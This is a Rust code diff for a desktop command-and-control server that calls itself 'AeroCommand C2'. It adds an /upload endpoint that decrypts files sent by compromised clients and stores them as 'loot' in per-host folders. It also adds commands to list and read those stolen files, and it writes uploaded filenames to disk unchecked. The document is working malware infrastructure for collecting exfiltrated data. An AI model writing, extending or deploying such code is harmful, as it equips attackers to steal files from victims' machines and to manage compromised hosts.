@@ -128,6 +128,57 @@ fn get_logs(state: State<Arc<AppState>>) -> Vec<CommandLog> {
     state.logs.lock().unwrap().clone()
 }
 
+#[derive(Serialize, Deserialize, Clone, Debug)]
+pub struct LootFile {
+    pub name: String,
+    pub path: String,
+    pub size: u64,
+    pub timestamp: String,
+    pub client: String,
+}
+
+#[tauri::command]
+fn get_loot() -> Vec<LootFile> {
+    let mut loot = vec![];
+    let loot_dir = std::path::Path::new("loot");
+    if !loot_dir.exists() {
+        return loot;
+    }
+
+    if let Ok(entries) = std::fs::read_dir(loot_dir) {
+        for entry in entries.flatten() {
+            if entry.path().is_dir() {
+                let client_name = entry.file_name().to_string_lossy().to_string();
+                if let Ok(sub_entries) = std::fs::read_dir(entry.path()) {
+                    for sub_entry in sub_entries.flatten() {
+                        if sub_entry.path().is_file() {
+                            let metadata = sub_entry.metadata().unwrap();
+                            loot.push(LootFile {
+                                name: sub_entry.file_name().to_string_lossy().to_string(),
+                                path: sub_entry.path().to_string_lossy().to_string(),
+                                size: metadata.len(),
+                                timestamp: metadata.modified().map(|t| {
+                                    let dt: chrono::DateTime<chrono::Local> = t.into();
+                                    dt.format("%Y-%m-%d %H:%M:%S").to_string()
+                                }).unwrap_or_default(),
+                                client: client_name.clone(),
+                            });
+                        }
+                    }
+                }
+            }
+        }
+    }
+    loot.sort_by(|a, b| b.timestamp.cmp(&a.timestamp));
+    loot
+}
+
+#[tauri::command]
+fn get_loot_file(path: String) -> Result<String, String> {
+    let content = std::fs::read(path).map_err(|e| e.to_string())?;
+    Ok(general_purpose::STANDARD.encode(content))
+}
+
 #[tauri::command]
 fn send_command(client_id: String, command: String, state: State<Arc<AppState>>) -> String {
     let mut pending = state.pending_commands.lock().unwrap();
@@ -293,6 +344,33 @@ pub fn run() {
                         }
                     }
                     let _ = request.respond(tiny_http::Response::from_string("OK"));
+                } else if clean_url.starts_with("/upload") {
+                    println!("[+] FILE UPLOAD from {}", client_ip);
+                    let mut content = String::new();
+                    let _ = request.as_reader().read_to_string(&mut content);
+                    
+                    if let Some(data) = decrypt_payload(&content) {
+                        let filename = data["name"].as_str().unwrap_or("unknown");
+                        let b64_data = data["file"].as_str().unwrap_or("");
+                        let client_id = data["client_id"].as_str().unwrap_or("unknown");
+                        
+                        let mut host = "unknown".to_string();
+                        {
+                            let clients = state_for_thread.clients.lock().unwrap();
+                            if let Some(c) = clients.iter().find(|c| c.id == client_id) {
+                                host = c.host.clone();
+                            }
+                        }
+
+                        if let Ok(file_bytes) = general_purpose::STANDARD.decode(b64_data) {
+                            let client_loot_dir = std::path::Path::new("loot").join(&host);
+                            let _ = std::fs::create_dir_all(&client_loot_dir);
+                            let save_path = client_loot_dir.join(filename);
+                            let _ = std::fs::write(save_path, file_bytes);
+                            println!("[+] Saved file {} for client {}", filename, host);
+                        }
+                    }
+                    let _ = request.respond(tiny_http::Response::from_string("OK"));
                 } else {
                     let _ = request.respond(tiny_http::Response::from_string("AeroCommand C2"));
                 }
@@ -303,7 +381,7 @@ pub fn run() {
     tauri::Builder::default()
         .manage(app_state)
         .plugin(tauri_plugin_opener::init())
-        .invoke_handler(tauri::generate_handler![get_clients, get_logs, send_command])
+        .invoke_handler(tauri::generate_handler![get_clients, get_logs, send_command, get_loot, get_loot_file])
         .run(tauri::generate_context!())
         .expect("error while running tauri application");
 }
